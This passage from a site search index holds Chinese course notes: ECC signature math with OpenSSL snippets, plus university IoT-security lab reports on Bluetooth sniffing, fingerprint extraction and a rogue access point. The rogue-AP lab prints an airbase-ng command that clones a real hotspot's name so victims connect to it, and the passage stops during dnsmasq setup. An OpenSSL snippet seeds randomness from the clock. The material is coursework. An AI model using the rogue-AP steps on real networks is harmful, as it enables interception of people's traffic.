<li>\\((s^{-1}\\times m\\times G + s^{-1}\\times r\\times R)\\) \u6a2a\u5750\u6807\u662f\u5426\u7b49\u4e8e \\(r\\)</li> </ul> </li> </ul> </li> <li>ecnr \u7b7e\u540d\u9a8c\u8bc1<ul> <li>\u7b7e\u540d<ul> <li>\\(r = (kG)_x+m\\)</li> <li>\\(s = k-rd\\)</li> </ul> </li> <li>\u9a8c\u8bc1<ul> <li>\\(r-(sG+rR)_x\\) \u662f\u5426\u7b49\u4e8e \\(m\\)</li> </ul> </li> </ul> </li> <li>openssl<ul> <li>\u66f2\u7ebf\u53c2\u6570 \\(a, b, p, n, G\\) \u548c\u79c1\u94a5 \\(d\\) \u90fd\u7528 BN \u7ed9\u51fa</li> <li>\u8bbe\u7f6e\u66f2\u7ebf     <pre><code>EC_GROUP *group = EC_GROUP_new(EC_GFp_mont_method());\nBN_CTX *ctx = BN_CTX_new();\nEC_GROUP_set_curve_GFp(group, p, a, b, ctx);\n</code></pre></li> <li>\u8bbe\u7f6e\u57fa\u70b9     <pre><code>EC_POINT *G = EC_POINT_new(group);\nEC_POINT_set_affine_coordinates_GFp(group, G, Gx, Gy, ctx);\nEC_GROUP_set_generator(group, G, n, BN_value_one());\n</code></pre></li> <li>\u8ba1\u7b97\u516c\u94a5 \\(R=dG\\)\uff08\u70b9\u4e58\uff09     <pre><code>EC_POINT *R = EC_POINT_new(group);\nEC_POINT_mul(group, R, d, NULL, NULL, ctx);\n</code></pre></li> <li>\u5176\u4ed6\u51fd\u6570     <pre><code>EC_POINT_get_affine_coordinates_GFp(...) // \u7c7b\u4f3c set\uff0c\u83b7\u53d6\u70b9\u6a2a\u7eb5\u5750\u6807\nEC_POINT_mul(group, T, NULL, R, k, ctx); // \u8ba1\u7b97 T=kR\nEC_POINT_set_compressed_coordinates_GFp(group, T, r, 0, ctx); // T \u6a2a\u5750\u6807\u4e3a r\uff0c\u8ba1\u7b97\u7eb5\u5750\u6807\nEC_POINT_free EC_GROUP_free\n</code></pre></li> <li>\u5927\u6570\u76f8\u5173     <pre><code>long ticks = (long)time(NULL);\nRAND_add(&amp;ticks, sizeof(ticks), 1);\nBN_rand(k, BN_num_bits(n), 0, 0); // \u4ea7\u751f\u4e0e n \u4f4d\u6570\u76f8\u7b49\u7684\u968f\u673a\u6570 k\nBN_copy(k, d); // \u590d\u5236\nBN_mod_mul(s, m, tx, n, ctx); // s = m * (kR)_x mod n\nBN_mod_inverse(k, k, n, ctx); // k = k^-1 mod n\n</code></pre></li> </ul> </li> </ul>"},{"location":"sec/iotsec/","title":"\u65e0\u7ebf\u4e0e\u7269\u8054\u7f51\u5b89\u5168\u57fa\u7840","text":"<p>Abstract</p> <p>\u6d59\u6c5f\u5927\u5b66 \u201c\u65e0\u7ebf\u4e0e\u7269\u8054\u7f51\u5b89\u5168\u57fa\u7840\u201d \u8bfe\u7a0b\u5b9e\u9a8c\u62a5\u544a\u5f52\u6863</p> <ul> <li>\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357\uff1a\u65e0\u7ebf\u4e0e\u7269\u8054\u7f51\u5b89\u5168\u57fa\u7840</li> </ul>"},{"location":"sec/iotsec/#table-of-contents","title":"Table of Contents","text":"<ul> <li>lab1: \u84dd\u7259\u4f20\u8f93\u4e0e\u55c5\u63a2</li> <li>lab2: \u6307\u7eb9\u63d0\u53d6\u4e0e\u5206\u6790</li> <li>lab3: \u4f2a\u9020 AP \u4e0e WPA2 \u5bc6\u7801\u7206\u7834</li> </ul>"},{"location":"sec/iotsec/lab1/","title":"\u84dd\u7259\u4f20\u8f93\u4e0e\u55c5\u63a2","text":"<p> \u7ea6 678 \u4e2a\u5b57  1 \u884c\u4ee3\u7801  8 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u65e0\u7ebf\u4e0e\u7269\u8054\u7f51\u5b89\u5168 lab1 \u5b9e\u9a8c\u62a5\u544a</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad\uff0c\u8bf7\u52ff\u7528\u4e8e\u975e\u6cd5\u7528\u9014\uff0c\u4e00\u5207\u540e\u679c\u4e0e\u672c\u4eba\u65e0\u5173</p>"},{"location":"sec/iotsec/lab1/#_2","title":"\u5b9e\u9a8c\u76ee\u6807","text":"<ol> <li>\u84dd\u7259\u6570\u636e\u5305\u7684\u53d1\u9001\u3002<ul> <li>\u7528 esp32 \u53d1\u9001\u84dd\u7259 beacon \u5e27</li> </ul> </li> <li>\u5bf9\u84dd\u7259\u6570\u636e\u5305\u8fdb\u884c\u55c5\u63a2<ul> <li>\u7528 nrf52840+wireshark \u8fdb\u884c\u55c5\u63a2\uff0c\u6355\u6349 esp32 \u53d1\u9001\u7684 beacon \u6570\u636e\u5305</li> </ul> </li> <li>\u53d1\u9001\u6307\u5b9a\u84dd\u7259\u5305\u5e76\u6293\u53d6<ul> <li>\u624b\u673a\u7aef\u901a\u8fc7 nRF Connect \u4e0e esp32 \u5efa\u7acb\u8fde\u63a5\uff0c\u5411 esp32 \u53d1\u9001\u6307\u5b9a\u6570\u636e\uff0c\u5e76\u901a\u8fc7 wireshark \u5bf9\u5176\u8fdb\u884c\u6355\u83b7</li> </ul> </li> </ol>"},{"location":"sec/iotsec/lab1/#_3","title":"\u5b9e\u9a8c\u8fc7\u7a0b","text":""},{"location":"sec/iotsec/lab1/#_4","title":"\u73af\u5883\u914d\u7f6e","text":"<p>\uff08macOS \u73af\u5883\uff09</p> <ul> <li>Arduino IDE \u4ece\u5b98\u7f51\u4e0b\u8f7d\uff0c\u5728 boards manager \u754c\u9762\u5b89\u88c5 esp32</li> <li>\u5b89\u88c5 wireshark</li> <li>\u914d\u7f6e nRF sniffer \u63d2\u4ef6<ul> <li>\u5c06\u63d2\u4ef6\u5305\u4e2d extcap \u6587\u4ef6\u5939\u4e0b\u7684\u5185\u5bb9\u79fb\u52a8\u81f3 wireshark \u7684 personal extcap \u6587\u4ef6\u5939\u4e0b</li> <li>\u4fee\u6539 nrf_sniffer_ble.sh \u4e2d python \u8def\u5f84</li> <li>\u5bf9\u5bf9\u5e94\u8def\u5f84\u7684 python \u5b89\u88c5 requirements.txt \u4e2d\u7684\u4f9d\u8d56</li> <li>\u6267\u884c ./nrf_sniffer_ble.sh --extcap-interfaces \u9a8c\u8bc1</li> </ul> </li> <li>\u5b89\u88c5 nRF Connect for Desktop<ul> <li>\u5728\u5176\u4e2d\u5b89\u88c5 programmer app</li> </ul> </li> <li>\u624b\u673a iOS App Store \u5b89\u88c5 nRF Connect</li> </ul>"},{"location":"sec/iotsec/lab1/#_5","title":"\u5f00\u53d1\u677f\u8fde\u63a5\u4e0e\u70e7\u5f55","text":"<p>\u8fde\u63a5 esp32 \u677f\u5b50\u5230\u7535\u8111\u540e\uff0cArduino IDE \u4e2d\u9009\u62e9 Board \u5e76\u6307\u5b9a ESP32 Dev Module\uff0c\u63a5\u4e0b\u6765\u53ef\u4ee5\u5728 File &gt; Examples \u4e2d\u627e\u5230 ESP32 BLE Arduino \u7cfb\u5217\u793a\u4f8b\u4ee3\u7801\uff0c\u9009\u62e9\u5176\u4e2d\u7684 BLE_iBeacon \u8fd0\u884c\u3002\u53ef\u4ee5\u4fee\u6539\u5176\u4e2d\u7684 DEVICE_NAME \u4f7f\u5176\u66f4\u5bb9\u6613\u8bc6\u522b\uff1a</p> <pre><code>#define DEVICE_NAME            \"ESP32_tonycrane\"\n</code></pre> <p>\u70e7\u5f55\u65f6\u9047\u5230\u4e86\u95ee\u9898 Unable to verify flash chip connection (Invalid head of packet (0xE0): Possible serial noise or corruption.). \u5728\u8c03\u6574 Tools &gt; Upload Speed \u4e3a 115200 \u540e\u89e3\u51b3\u3002</p> <p>\u6b64\u65f6\u677f\u5b50\u5c31\u5f00\u59cb\u53d1\u9001 beacon \u4fe1\u53f7\u7b49\u5f85\u8fde\u63a5\u4e86\u3002</p>"},{"location":"sec/iotsec/lab1/#nrf-sniffer","title":"nRF Sniffer \u70e7\u5f55","text":"<p>\u5c06 sniffer \u6a21\u5757\u8fde\u63a5\u81f3\u7535\u8111\uff0c\u6309\u677f\u5b50\u4e0a\u5927\u6309\u94ae\u65c1\u8fb9\u7684\u4fa7\u6309\u94ae reset\u3002\u6253\u5f00 nRF Connect \u4e2d\u7684 Programmer\uff0c\u9009\u62e9 Open DFU Bootloader\uff0c\u518d\u8f7d\u5165\u63d2\u4ef6\u6587\u4ef6\u5939\u4e2d\u7684 sniffer_nrf52840dongle_nrf52840_4.1.1.hex\uff0c\u8fdb\u884c write \u5373\u53ef\uff1a</p> <p>\u6b64\u65f6\u9009\u62e9\u8bbe\u5907\u5904\u53d8\u4e3a nRF Sniffer for Bluetooth LE\uff0c\u5373\u53ef\u4ee5\u4f7f\u7528\u3002</p>"},{"location":"sec/iotsec/lab1/#wireshark","title":"Wireshark \u6293\u5305","text":"<p>\u6253\u5f00 Wireshark \u540e\u53ef\u4ee5\u770b\u5230\u5728 USB \u63a5\u53e3\u4e0a\u7684 nRF Sniffer:</p> <p>\u9009\u62e9\u8fd9\u4e2a\u63a5\u53e3\u8fdb\u884c\u6d41\u91cf\u6355\u83b7\uff0c\u5728\u542f\u52a8\u4e86 esp32 \u677f\u5b50\u5e76\u70e7\u5f55\u4e86 BLE_iBeacon \u7a0b\u5e8f\u540e\uff0c\u53ef\u4ee5\u5728 device \u5904\u53d1\u73b0\u8fd9\u4e2a\u8bbe\u5907\u5e76\u8fc7\u6ee4\u53ea\u4fdd\u7559\u8fd9\u4e2a\u8bbe\u5907\u4e0a\u7684\u6570\u636e\u5305\uff1a</p> <p>\u53ef\u4ee5\u770b\u89c1\u4ece\u677f\u5b50\u53d1\u51fa\u6765\u7684 beacon \u5e27\uff0c\u6b64\u65f6\u6b63\u5728\u7b49\u5f85\u8fde\u63a5\u3002\u5728\u624b\u673a\u4e0a\u8fde\u63a5\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u4e00\u76f4\u5728\u6536\u53d1 Empty PDU\uff1a</p> <p>App Store \u4e0a\u4e0b\u8f7d\u7684 nRF Sniffer \u5728\u8fd9\u91cc\u4f1a\u5361\u5728 connecting \u72b6\u6001\uff0c\u6240\u4ee5\u6211\u6362\u6210\u4e86\u201c\u84dd\u7259\u8c03\u8bd5\u52a9\u624b\u201d\u8fd9\u4e2a APP \u6765\u8fde\u63a5\uff0c\u63a5\u6536\u677f\u5b50\u7684 notify \u5e76\u53d1\u9001\u5b66\u53f7\u540e\u56db\u4f4d 5811:</p> <p>\u6b64\u65f6 Arduino \u7684\u4e32\u53e3\u4e5f\u76d1\u6d4b\u5230\u4e86\u8f93\u51fa\uff1a</p> <p>\u5728 Wireshark \u4e2d\u4e5f\u53ef\u4ee5\u6355\u83b7\u5230\u5305\u542b 5811 \u660e\u6587\u7684 Send Write Request \u6570\u636e\u5305\uff1a</p> <p>\u81f3\u6b64\u5b8c\u6210\u4e86\u5b9e\u9a8c\u76ee\u6807\uff0c\u8fdb\u884c\u4e86\u84dd\u7259\u6570\u636e\u7684\u6536\u53d1\uff0c\u4ee5\u53ca\u901a\u8fc7 wireshark \u8fdb\u884c\u6570\u636e\u7684\u6355\u83b7\u3002</p>"},{"location":"sec/iotsec/lab2/","title":"\u6307\u7eb9\u63d0\u53d6\u4e0e\u5206\u6790","text":"<p> \u7ea6 905 \u4e2a\u5b57  130 \u884c\u4ee3\u7801  4 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p> <p>Abstract</p> <p>\u65e0\u7ebf\u4e0e\u7269\u8054\u7f51\u5b89\u5168 lab2 \u5b9e\u9a8c\u62a5\u544a\uff08\u5b9e\u9a8c\u4e2d\u4f7f\u7528\u6307\u7eb9\u975e\u672c\u4eba\u6307\u7eb9\uff09</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"sec/iotsec/lab2/#_2","title":"\u5b9e\u9a8c\u8fc7\u7a0b","text":""},{"location":"sec/iotsec/lab2/#mindtct","title":"\u5b89\u88c5 mindtct","text":"<p>\u9996\u5148\u914d\u7f6e\u597d cmake \u73af\u5883\uff0c\u7136\u540e\u6267\u884c\uff1a</p> <pre><code>./setup.sh $(pwd) --without-X11\n</code></pre> <p>\u8fd9\u91cc\u4e0d\u80fd\u76f4\u63a5\u5199 . \u4e0d\u7136\u5728\u540e\u9762 make install \u7684\u65f6\u5019\u76ee\u6807\u8def\u5f84\u5c31\u90fd\u662f\u76f8\u5bf9\u8def\u5f84\u5bfc\u81f4\u62f7\u8d1d\u5931\u8d25\u3002</p> <p>\u63a5\u7740\u8fdb\u884c\u7f16\u8bd1\u5373\u53ef\uff1a</p> <pre><code>make config\nmake it\nmake install\nmake catalog\n</code></pre> <p>\u5728 make it \u7684\u65f6\u5019\u4e0b\u53d1\u7684\u4ee3\u7801\u4e2d\u5305\u542b histo_head \u91cd\u5b9a\u4e49\u7684\u9519\u8bef\uff0c\u53ef\u4ee5\u901a\u8fc7\u52a9\u6559\u63d0\u4f9b\u7684 https://aur.archlinux.org/cgit/aur.git/tree/0000-use-extern-header-an2k.patch?h=nbis \u5c06 an2k/include/histogen.h \u548c an2k/src/bin/bistogen/chkfile.c \u6587\u4ef6\u8fdb\u884c\u4fee\u6539\u3002\u540c\u65f6\u6211\u4e5f\u627e\u5230\u4e86 https://github.com/NoahGWood/OpenEFT/discussions/17\uff0c\u53ef\u4ee5\u4f7f\u7528 https://github.com/OwenPemberton/nbis \u8fd9\u91cc\u7684\u6e90\u7801\uff0c\u7248\u672c\u540c\u6837\u4e3a v5.0.0\uff0c\u53ea\u662f\u5728 makefile \u4e2d\u6dfb\u52a0\u4e86 -fcommon \u7f16\u8bd1\u9009\u9879\u6765\u89e3\u51b3\u91cd\u5b9a\u4e49\u95ee\u9898\u3002</p>"},{"location":"sec/iotsec/lab2/#mindtct_1","title":"mindtct \u63d0\u53d6\u6307\u7eb9","text":"<p>\u901a\u8fc7 help \u77e5\u9053\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u6765\u63d0\u53d6 finger.jpg \u4e2d\u7684\u6307\u7eb9\u6570\u636e\u5230 finger \u5f00\u5934\u7684\u6587\u4ef6\uff1a</p> <pre><code>./bin/mindtct ./finger.jpg finger\n</code></pre> <p>\u4f46\u8fd9\u65f6\u4f1a\u62a5\u9519\uff1a</p> <pre><code>ERROR : read_and_decode_grayscale_image : finger.jpg : image depth : 24 != 8\n</code></pre> <p>\u6240\u4ee5\u8981\u5148\u5c06\u6307\u7eb9\u56fe\u7247\u6539\u4e3a\u516b\u4f4d\u7070\u9636\u56fe\uff1a</p> <pre><code>In [1]: from PIL import Image\n\nIn [2]: Image.open(\"finger.jpg\").convert(\"L\").save(\"finger_L.jpg\")\n</code></pre> <p>\u518d\u8fd0\u884c mindtct \u5c31\u53ef\u4ee5\u5f97\u5230\u4ee5\u4e0b\u6587\u4ef6\uff1a</p> <pre><code>finger.brw finger.dm  finger.hcm finger.lcm finger.lfm finger.min finger.qm  finger.xyt\n</code></pre>"},{"location":"sec/iotsec/lab2/#_3","title":"\u751f\u6210\u6307\u7eb9\u65b9\u5411\u573a\u56fe\u50cf","text":"<p>\u5411\u91cf\u573a\u6570\u636e\u8f93\u51fa\u5728 finger.dm \u4e2d\uff0c\u662f\u77e9\u9635\u5f62\u5f0f\u7684\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 np.loadtxt \u5bfc\u5165\uff0c\u7136\u540e\u6839\u636e\u5143\u7d20\u4f4d\u7f6e\u4e0a\u7684\u503c\u9664\u4ee5 16 \u5360 180 \u5ea6\u7684\u6bd4\u4f8b\u6765\u8ba1\u7b97\u89d2\u5ea6\uff0c\u518d\u901a\u8fc7 PIL.ImageDraw.Draw.line \u753b\u51fa\u7ebf\u6761\uff1a</p> <pre><code>from PIL import Image, ImageDraw\nimport numpy as np\n\ndm = np.loadtxt(\"data/finger.dm\")\n\nUNIT = 30\nvector_image = Image.new(\"L\", (dm.shape[1] * UNIT, dm.shape[0] * UNIT), 255)\ndraw = ImageDraw.Draw(vector_image)\n\nfor y in range(dm.shape[0]):\n    for x in range(dm.shape[1]):\n        if dm[y, x] == -1:\n            continue\n        angle = dm[y, x] / 16 * 180 + 90\n        sx = x * UNIT\n        sy = y * UNIT\n        ex = sx + np.cos(np.radians(angle)) * (UNIT - 4)\n        ey = sy + np.sin(np.radians(angle)) * (UNIT - 4)\n        draw.line((sx, sy, ex, ey), fill=0, width=4)\n\n# vector_image.show()\nvector_image.save(\"finger_vector.jpg\")\n</code></pre> <p>\u5f97\u5230\u56fe\u7247\u7ed3\u679c\u5982\u4e0b\uff1a</p>"},{"location":"sec/iotsec/lab2/#_4","title":"\u5728\u539f\u59cb\u6307\u7eb9\u56fe\u50cf\u4e0a\u6807\u6ce8\u7279\u5f81\u70b9","text":"<p>\u7279\u5f81\u70b9\u6570\u636e\u5728 finger.xyt \u6587\u4ef6\u4e2d\uff0c\u6bcf\u884c\u524d\u4e09\u4e2a\u503c\u5206\u522b\u8868\u793a\u4e00\u4e2a\u7279\u5f81\u70b9\u7684 xy \u5750\u6807\u548c\u65b9\u5411\uff0c\u901a\u8fc7\u7a7a\u683c\u5206\u9694\u3002\u5b9e\u6d4b\u6b64\u5904\u7684\u5750\u6807\u662f\u4e0a\u4e0b\u7ffb\u8f6c\u7684\uff0c\u6240\u4ee5\u8981\u7528\u56fe\u7247 height \u51cf\u53bb y \u5750\u6807\u5f97\u5230\u7ed8\u56fe\u7684 y \u5750\u6807\uff0c\u5e76\u5bf9\u89d2\u5ea6\u53d6\u76f8\u53cd\u6570\u3002\u7136\u540e\u5229\u7528 PIL.ImageDraw.Draw.rectangle \u548c line \u5373\u53ef\u753b\u51fa\u7279\u5f81\u70b9\u4f4d\u7f6e\u4ee5\u53ca\u65b9\u5411\u4fe1\u606f\uff1a</p> <pre><code>img = Image.open(\"finger.png\")\nimg_draw = ImageDraw.Draw(img)\ndata = [list(map(int, line.strip().split()))[:-1] for line in open(\"data/finger.xyt\")]\n\nfor x, y, t in data:\n    y = img.height - y\n    t = -t\n    img_draw.rectangle((x - 2, y - 2, x + 2, y + 2), outline=(255, 0, 0), width=1)\n    ex = int(x + np.cos(np.radians(t)) * 10)\n    ey = int(y + np.sin(np.radians(t)) * 10)\n    img_draw.line((x, y, ex, ey), fill=(0, 0, 255), width=1)\n\n# img.show()\nimg.save(\"finger_minutiae.jpg\")\n</code></pre> <p>\u5f97\u5230\u56fe\u7247\u7ed3\u679c\u5982\u4e0b\uff1a</p>"},{"location":"sec/iotsec/lab2/#codefingerprintextraction","title":"\u8fd0\u884c code/FingerprintExtraction","text":"<p>\u5148\u5b89\u88c5\u4f9d\u8d56\uff1a</p> <pre><code>pip install opencv-contrib-python imutils scipy matplotlib\n</code></pre> <p>\u7136\u540e\u5c06 finger_L.jpg \u653e\u5165 inputimages \u6587\u4ef6\u5939\u4e2d\uff0c\u8fd0\u884c\uff1a</p> <pre><code>python main.py --inputPath inputimages --outputPath ./outputimages\n</code></pre> <p>\u5f97\u5230 outputimages \u4e2d\u7ed3\u679c\uff08enhanced\u3001minutiae\u3001orient\uff09\uff1a</p>"},{"location":"sec/iotsec/lab2/#_5","title":"\u95ee\u9898\u56de\u7b54","text":""},{"location":"sec/iotsec/lab2/#_6","title":"\u6307\u7eb9\u65b9\u5411\u573a\u63d0\u53d6\u8fc7\u7a0b","text":"<p>\u6307\u7eb9\u65b9\u5411\u573a\u63d0\u53d6\u7684\u4ee3\u7801\u5728 levelOneExtraction.py \u4e2d\u7684 findOrientationPhase \u51fd\u6570\u4ee5\u53ca findOrient \u51fd\u6570\u4e2d\uff0c\u4e3b\u8981\u8fc7\u7a0b\u4e3a\uff1a</p> <ul> <li>\u5c06\u8f93\u5165\u56fe\u50cf\u5207\u6210 16x16 \u7684\u5c0f\u5757\uff0c\u5bf9\u6bcf\u5757\u8fdb\u884c findOrient</li> <li>findOrient \u8ba1\u7b97\u6bcf\u5757\u4e2d\u7684\u6307\u7eb9\u65b9\u5411<ul> <li>\u8ba1\u7b97\u6bcf\u4e2a\u50cf\u7d20\u70b9\u7684\u68af\u5ea6\uff0c\u5e76\u7d2f\u52a0\u5230 numerator \u548c denominator \u4e2d</li> <li>\u8ba1\u7b97 theta\uff0c\u5982\u679c theta \u5927\u4e8e 0 \u5219\u51cf\u53bb np.pi / 2\uff0c\u518d\u52a0\u4e0a np.pi</li> <li>\u8ba1\u7b97 percent\uff0c\u4e3a 1 \u51cf\u53bb\u975e\u96f6\u50cf\u7d20\u70b9\u6570\u9664\u4ee5\u603b\u50cf\u7d20\u70b9\u6570</li> <li>\u5982\u679c theta \u7b49\u4e8e np.pi\uff0c\u5219\u5c06\u56fe\u50cf\u65cb\u8f6c 90 \u5ea6\uff0c\u518d\u6b21\u8ba1\u7b97 theta</li> <li>\u8fd4\u56de theta \u548c percent</li> </ul> </li> <li>\u5c06\u6bcf\u5757\u7684 theta \u548c percent \u8fdb\u884c\u8c03\u6574\uff0c\u62fc\u63a5\u5230\u4e00\u8d77\uff0c\u5f97\u5230\u6574\u4f53\u7684\u6307\u7eb9\u65b9\u5411\u573a</li> </ul> <pre><code>def findOrient(img):\n    numerator = 0\n    denominator = 0\n    for y in range(1, img.shape[0]):\n        for x in range(1, img.shape[1]):\n            bx1, bx2 = img[y, x], img[y, x - 1]\n            by1, by2 = img[y, x], img[y - 1, x]\n            gx = int(bx1) - int(bx2)\n            gy = int(by1) - int(by2)\n            numerator += (2 * gx * gy)\n            denominator += (math.pow(gx, 2) - math.pow(gy, 2))\n    percent = 0\n    theta = np.pi\n    if denominator != 0.00000000:\n        base = numerator / denominator\n        theta = .5 * np.arctan(base)\n        if theta &gt; 0:\n            theta -= np.pi / 2\n        theta += np.pi\n        percent = 1 - (np.count_nonzero(img) / (img.shape[0] * img.shape[1]))\n        if theta == np.pi:\n            img2 = np.rot90(img)\n            numerator = 0\n            denominator = 0\n            for y in range(1, img2.shape[0]):\n                for x in range(1, img2.shape[1]):\n                    bx1, bx2 = img2[y, x], img2[y, x - 1]\n                    by1, by2 = img2[y, x], img2[y - 1, x]\n                    gx = bx1 - bx2\n                    gy = by1 - by2\n                    numerator += (2 * gx * gy)\n                    denominator += (math.pow(gx, 2) - math.pow(gy, 2))\n            theta = np.pi\n            if denominator != 0.00000000:\n                base = numerator / denominator\n                theta = .5 * np.arctan(base)\n                if theta &gt; 0:\n                    theta -= np.pi / 2\n                theta += np.pi\n                theta += np.pi / 2\n    return theta, 2 * percent\n</code></pre>"},{"location":"sec/iotsec/lab2/#_7","title":"\u6307\u7eb9\u810a\u7ebf\u9891\u7387\u63d0\u53d6\u8fc7\u7a0b","text":"<p>\u810a\u7ebf\u9891\u7387\u56fe\u63d0\u53d6\u7684\u76f8\u5173\u4ee3\u7801\u5728\u540c\u4e00\u6587\u4ef6\u4e2d\u7684 findRidgeFlowCount \u51fd\u6570\u548c getRidgeCount \u51fd\u6570\u4e2d\uff0c\u4e3b\u8981\u8fc7\u7a0b\u4e3a\uff1a</p> <ul> <li>\u5c06\u8f93\u5165\u56fe\u50cf\u5207\u6210 16x16 \u7684\u5c0f\u5757\uff0c\u5bf9\u6bcf\u5757\u8fdb\u884c getRidgeCount</li> <li>getRidgeCount \u8ba1\u7b97\u6bcf\u5757\u4e2d\u7684\u810a\u7ebf\u9891\u7387<ul> <li>\u5c06\u6bcf\u5757\u65cb\u8f6c\u5230\u6307\u7eb9\u65b9\u5411\uff0c\u518d\u88c1\u526a\u5230 16x16 \u5927\u5c0f</li> <li>\u5bf9\u88c1\u526a\u540e\u7684\u56fe\u50cf\u8fdb\u884c\u4e8c\u503c\u5316\uff0c\u7136\u540e\u7edf\u8ba1\u6bcf\u884c\u7684\u9ed1\u767d\u5757\u6570\u91cf</li> <li>\u8ba1\u7b97\u6bcf\u884c\u7684\u9ed1\u5757\u6570\u91cf\uff0c\u5f97\u5230\u810a\u7ebf\u9891\u7387</li> </ul> </li> <li>\u5bf9\u6bcf\u5757\u7684 count \u8fdb\u884c\u62fc\u63a5\uff0c\u5f97\u5230\u6574\u4f53\u7684\u810a\u7ebf\u9891\u7387\u56fe</li> </ul> <pre><code>def getRidgeCount(img, center, orientation):\n    ridges = []\n    ridgeCount = 0\n    x, y = center\n    angle, strength = orientation\n    theta = angle / 2 / np.pi * 360\n    block = img[max(y - 16, 0):min(y + 16, img.shape[0]), max(x - 16, 0):min(x + 16, img.shape[1])]\n    if block.shape[0] == 32 and block.shape[1] == 32:\n        rotated = imutils.rotate(block, theta)\n        rotatedCrop = rotated[:, 4:20]\n        rotatedCrop = np.rot90(rotatedCrop)\n        res, rotatedCrop = cv2.threshold(rotatedCrop, 127, 255, cv2.THRESH_BINARY)\n        for y in range(rotatedCrop.shape[0]):\n            if np.count_nonzero(rotatedCrop[y, :]) &lt; 32:\n                blk = []\n                wte = []\n                current = rotatedCrop[y, 0]\n                count = 1\n                for x in range(1, rotatedCrop.shape[1]):\n                    if current == rotatedCrop[y, x]:\n                        count += 1\n                    else:\n                        if current == 0:\n                            blk.append(count)\n                            count = 1\n                            current = 255\n                        else:\n                            wte.append(count)\n                            count = 1\n                            current = 0\n                ridges.append(len(blk))\n        if len(ridges) &gt; 0:\n            ridgeCount = sum(ridges) / len(ridges)\n        if ridgeCount % 1 &gt;= .5:\n            ridgeCount = int(ridgeCount) + 1\n        else:\n            ridgeCount = int(ridgeCount)\n    return ridgeCount\n</code></pre>"},{"location":"sec/iotsec/lab2/#python","title":"Python \u4ee3\u7801\u4e2d\u6307\u7eb9\u63d0\u53d6\u7528\u4e86\u4ec0\u4e48\u6ee4\u6ce2\u5668\uff1f","text":"<p>\u5728\u8f93\u51fa\u5230 _enhanced \u7ed3\u5c3e\u7684\u56fe\u7247\u65f6\uff0c\u8c03\u7528\u4e86 imageFilter1 \u51fd\u6570\u8fdb\u884c\u6ee4\u6ce2\uff0c\u5176\u8fd8\u8c03\u7528\u4e86 FingerprintEnhancement \u4e2d\u7684 main_enhancement \u51fd\u6570\uff0c\u5176\u4e2d\u7528\u5230\u7684\u6ee4\u6ce2\u5668\u6709\uff1a</p> <ul> <li>\u5747\u503c\u6ee4\u6ce2\u5668\uff1a<code>res = cv2.filter2D(res, -1, kernel)</code></li> <li>\u9ad8\u65af\u6ee4\u6ce2\u5668\uff1a<code>res = cv2.GaussianBlur(res, (5, 5), 0)</code></li> <li>Gabor \u6ee4\u6ce2\u5668\uff1a\u5728 FingerprintEnhancement/ridge_filter.py \u4e2d\u5b9e\u73b0\uff0c\u5728 image_enhance.py \u4e2d\u8c03\u7528\uff1a     <pre><code>newim = ridge_filter(normim, orientim, freq, kx, ky)\n# create gabor filter and do the actual filtering\n</code></pre></li> </ul>"},{"location":"sec/iotsec/lab3/","title":"\u4f2a\u9020 AP \u4e0e WPA2 \u5bc6\u7801\u7206\u7834","text":"<p> \u7ea6 1328 \u4e2a\u5b57  2 \u884c\u4ee3\u7801  11 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>Abstract</p> <p>\u65e0\u7ebf\u4e0e\u7269\u8054\u7f51\u5b89\u5168 lab3 \u5b9e\u9a8c\u62a5\u544a\uff08\u5b9e\u9a8c\u4e2d\u4f7f\u7528\u6307\u7eb9\u975e\u672c\u4eba\u6307\u7eb9\uff09</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad\uff0c\u8bf7\u52ff\u7528\u4e8e\u975e\u6cd5\u7528\u9014\uff0c\u4e00\u5207\u540e\u679c\u4e0e\u672c\u4eba\u65e0\u5173</p>"},{"location":"sec/iotsec/lab3/#_1","title":"\u5b9e\u9a8c\u76ee\u6807","text":"<ol> <li>\u5229\u7528\u65e0\u7ebf\u7f51\u5361\u4f2a\u9020\u624b\u673a\u70ed\u70b9\uff0c\u5e76\u5f15\u5bfc\u88ab\u5bb3\u8005\u8fde\u63a5\u4f2a\u9020 AP </li> <li>\u66b4\u529b\u7834\u89e3 WPA2-Personal \u52a0\u5bc6 WiFi</li> </ol>"},{"location":"sec/iotsec/lab3/#_2","title":"\u5b9e\u9a8c\u8fc7\u7a0b","text":""},{"location":"sec/iotsec/lab3/#fake-ap","title":"Fake AP \u5b9e\u9a8c","text":"<p>\u4e00\u53f0\u624b\u673a\u5f00\u542f\u65e0\u5bc6\u7801\u70ed\u70b9\u201ciQOO Neo9\u201d\uff0c\u53e6\u4e00\u53f0\u624b\u673a\u641c\u7d22\u53ef\u4ee5\u6b63\u5e38\u8fde\u63a5\u3002\u901a\u8fc7 airodump-ng \u67e5\u627e\u70ed\u70b9\uff08\u8fd9\u91cc\u65e0\u7ebf\u7f51\u5361\u7684\u7f51\u7edc\u63a5\u53e3\u662f wlx0013eff1140e \u800c\u4e0d\u662f wlan0\uff09\uff1a</p> <p>\u53ef\u4ee5\u770b\u5230\u8be5\u70ed\u70b9\u7684 BSSID \u4e0e Channel\u3002\u63a5\u4e0b\u6765\u901a\u8fc7 airbase-ng \u4f2a\u9020 AP\uff1a</p> <pre><code>airbase-ng -e \"iQOO Neo9\" -c 6 wlx0013eff1140e\n</code></pre> <p>\u7136\u540e\u8bbe\u7f6e IP\u3001\u7f51\u5173\uff0c\u8fd0\u884c dnsmasq\uff1a</p> <p>dnsmasq \u65e0\u6cd5\u542f\u52a8\uff0c\u56e0\u4e3a systemd-resolved 